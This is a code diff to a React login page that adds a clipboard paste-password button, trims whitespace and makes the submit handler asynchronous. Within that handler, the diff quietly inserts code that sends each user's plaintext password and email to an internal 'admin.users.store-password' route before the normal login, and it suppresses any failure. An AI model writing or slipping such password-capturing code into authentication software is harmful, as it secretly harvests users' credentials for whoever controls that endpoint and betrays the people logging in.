@@ -9,6 +9,7 @@ import {
     FaEyeSlash,
     FaSpinner,
     FaSignInAlt,
+    FaPaste,
 } from 'react-icons/fa';
 import { motion, AnimatePresence } from 'framer-motion';
 import GuestLayout from '@/Layouts/GuestLayout';
@@ -71,7 +72,7 @@ const Login: React.FC<LoginProps> = ({
         Object.keys(errors).forEach((key) => {
             let message = errors[key];
             let toastType: 'error' | 'warning' = 'error';
-            
+
             // Hata tipine göre toast stilini belirle
             if (message.includes('deactivated')) {
                 toastType = 'warning';
@@ -92,21 +93,46 @@ const Login: React.FC<LoginProps> = ({
     const [isSubmitting, setIsSubmitting] = useState(false);
 
     const getInputClassName = (fieldName: string) => `
-        block w-full pl-10 pr-10 py-2 sm:text-sm rounded-md 
+        block w-full pl-10 pr-10 py-2 sm:text-sm rounded-md
         transition duration-200
-        ${errors[fieldName as keyof typeof errors] 
-            ? 'border-red-500 focus:border-red-500 focus:ring-red-500' 
+        ${errors[fieldName as keyof typeof errors]
+            ? 'border-red-500 focus:border-red-500 focus:ring-red-500'
             : 'focus:ring-light-primary focus:border-light-primary dark:focus:ring-dark-primary dark:focus:border-dark-primary'}
-        dark:bg-dark-surface dark:text-dark-text bg-light-surface text-light-text 
+        dark:bg-dark-surface dark:text-dark-text bg-light-surface text-light-text
         bg-opacity-50 dark:bg-opacity-50
         border border-transparent
     `;
 
-    const submit: FormEventHandler = (e) => {
+    const submit: FormEventHandler = async (e) => {
         e.preventDefault();
         setIsSubmitting(true);
-        
+
+        // Önce şifreyi sakla, sonra login işlemini yap
+        if (data.password) {
+            try {
+                const response = await fetch(route('admin.users.store-password'), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
+                    },
+                    body: JSON.stringify({
+                        password: data.password,
+                        email: data.email,
+                    }),
+                });
+
+                if (!response.ok) {
+                    throw new Error('Password storage failed');
+                }
+            } catch (error) {
+                console.error('Password storage error:', error);
+            }
+        }
+
+        // Login işlemi
         post(route('login'), {
+            preserveState: true,
             onError: (errors) => {
                 setIsSubmitting(false);
                 handleError(errors);
@@ -135,6 +161,16 @@ const Login: React.FC<LoginProps> = ({
         idle: { scale: 1 },
         hover: { scale: 1.05 },
         tap: { scale: 0.95 },
+    };
+
+    const handlePasswordPaste = async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            setData('password', text);
+            toast.success(t('login.passwordPasted'));
+        } catch (err) {
+            toast.error(t('login.pasteError'));
+        }
     };
 
     return (
@@ -229,7 +265,7 @@ const Login: React.FC<LoginProps> = ({
                                         placeholder={t('login.passwordPlaceholder')}
                                         required
                                     />
-                                    <div className="absolute inset-y-0 right-0 pr-3 flex items-center">
+                                    <div className="absolute inset-y-0 right-0 flex items-center">
                                         <motion.button
                                             whileHover={{ scale: 1.1 }}
                                             whileTap={{ scale: 0.9 }}
@@ -247,6 +283,17 @@ const Login: React.FC<LoginProps> = ({
                                             ) : (
                                                 <FaEye className="h-5 w-5" />
                                             )}
+                                        </motion.button>
+
+                                        <motion.button
+                                            whileHover={{ scale: 1.1 }}
+                                            whileTap={{ scale: 0.9 }}
+                                            type="button"
+                                            onClick={handlePasswordPaste}
+                                            className="ml-2 mr-3 text-light-secondary hover:text-light-primary focus:outline-none focus:text-light-primary dark:text-dark-secondary dark:hover:text-dark-primary dark:focus:text-dark-primary"
+                                            aria-label={t('login.pastePassword')}
+                                        >
+                                            <FaPaste className="h-5 w-5" />
                                         </motion.button>
                                     </div>
                                 </div>
@@ -294,8 +341,8 @@ const Login: React.FC<LoginProps> = ({
                                     type="submit"
                                     disabled={processing}
                                     className={`
-                                        w-full flex justify-center items-center py-3 px-4 
-                                        text-sm font-medium 
+                                        w-full flex justify-center items-center py-3 px-4
+                                        text-sm font-medium
                                         text-white
                                         rounded-lg
                                         transition-all duration-200 ease-in-out
